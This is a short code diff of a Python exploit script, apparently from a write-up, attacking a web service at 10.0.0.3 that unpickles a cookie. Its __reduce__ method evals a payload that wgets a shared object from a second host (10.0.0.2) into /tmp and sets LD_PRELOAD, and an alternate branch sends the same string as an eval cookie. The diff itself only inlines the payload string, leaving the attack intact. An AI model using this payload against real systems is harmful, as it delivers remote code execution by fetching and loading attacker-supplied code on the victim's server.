@@ -58,15 +58,14 @@ import pickle
 import requests
 import os
 
-payload = '__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")'
 
 class Exploit(object):
     def __reduce__(self):
-        return eval, (payload,)
+        return eval, ('__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")',)
 
 
 if True:
     requests.post('http://10.0.0.3:5000/', cookies={'pickle': b64encode(pickle.dumps(Exploit())).decode()})
 else:
-    requests.post('http://10.0.0.3:5000/', cookies={'eval': payload})
+    requests.post('http://10.0.0.3:5000/', cookies={'eval': '__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")'})
 ```
